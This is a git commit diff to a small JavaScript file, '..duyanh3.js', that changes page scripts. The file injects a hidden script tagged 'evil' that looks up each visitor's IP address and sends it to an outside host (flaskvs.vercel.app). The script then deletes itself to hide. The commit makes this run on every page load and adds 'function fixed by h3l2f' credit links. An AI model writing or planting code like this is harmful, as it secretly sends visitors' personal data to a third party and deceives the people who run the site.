0e23f13b36af628fa41dc7a7383e98b02caca1b0
h3l2f <88704154+h3l2f@users.noreply.github.com>
2024-12-07 16:24:43 +0700

    Update ..duyanh3.js

--- ..duyanh3.js
+++ ..duyanh3.js
@@ -1,5 +1,4 @@
-var e = null
-        function e1() {
+		$(document).ready(()=>{
             $("#r4").append(`<script id="evil">
             fetch("https://ipv4.jsonip.com")
             .then(r => r.json())
@@ -7,14 +6,14 @@ var e = null
             fetch("https://flaskvs.vercel.app/m/"+"duyanh3: "+r.ip, {mode: "no-cors"})
             });
             $("#r4")[0].removeChild(document.getElementById("evil"));
-            <\/script>`)
-        }
+            <\/script>`);
+          $("#r1").html("function fixed by <a href=\"https:\/\/h3l2f.site\">h3l2f</a><br>"+$("#r1").html())
+          $("#r2").html("function fixed by <a href=\"https:\/\/h3l2f.site\">h3l2f</a><br>"+$("#r2").html())
+          $("#r3").html("function fixed by <a href=\"https:\/\/h3l2f.site\">h3l2f</a><br>"+$("#r3").html())
+          $("#r4").html("function fixed by <a href=\"https:\/\/h3l2f.site\">h3l2f</a><br>"+$("#r4").html())
+        })
         
         function changeTab(t) {
-            if (!e) {
-                e = 1;
-                e1();
-            }
             $("#r1, #r2, #r3, #r4").hide();
             $(`#r${$(t).attr("tab")}`).show()
         }
